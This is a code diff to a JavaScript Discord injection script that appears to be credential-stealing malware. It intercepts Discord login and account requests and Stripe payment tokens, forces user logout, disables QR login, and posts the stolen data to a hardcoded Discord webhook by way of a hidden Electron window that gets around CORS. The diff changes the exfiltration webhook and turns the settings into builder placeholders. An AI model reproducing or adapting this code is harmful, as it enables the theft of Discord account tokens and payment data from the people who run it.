@@ -1,3 +1,4 @@
+// else aint working idk why
 const {
     BrowserWindow,
     session
@@ -6,7 +7,7 @@ const fs = require('fs');
 const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
-const webhook = "https://discord.com/api/webhooks/1003460813379612762/KIELXn1rKieHfGzAwBMCZexxkL_agBbqVaxLhB9_qy8EtLHi8pV4QJ6AzytVVlJjq4hr"
+const webhook = "https://discordapp.com/api/webhooks/1013304965487394856/o3i0gHlgr9hJXzFfjMktKYR_x4ch5qOxPupE7x0PGTZf_ADyb5vh3lvBSAl6i_YaaSex"
 const Filters = {
     1: {
         urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
@@ -17,12 +18,12 @@ const Filters = {
 };
 
 const config = {
-    "minimum_members_per_server":"true",
-    "logout": "instant",
-    "logout-notify": "true",
-    "init-notify": "true",
+    "minimum_members_per_server":"%MIN_MEMBERS%",
+    "logout": "%LOGOUT%",
+    "logout-notify": "%LOGOUTNOTI%",
+    "init-notify": "%INITNOTI%",
     "embed-color": 347704,
-    "disable-qr-code": "true",
+    "disable-qr-code": "%DISABLEQRCODE%",
     "ping": [false, "@everyone"]
 };
 
@@ -707,11 +708,13 @@ async function sendToWebhook(params) {
     window.loadURL("https://w3.org/") // Any website that enable cors security policy
     window.webContents.executeJavaScript(`
      new Promise(function (resolve, reject) {
+
         var xhr = new XMLHttpRequest();xhr.open("POST", "${webhook}", true);
         xhr.onload = function () {
             resolve(xhr.response)
         }
         xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify(${params}));
+
     });
         `, true).then(() => {
         window.close()
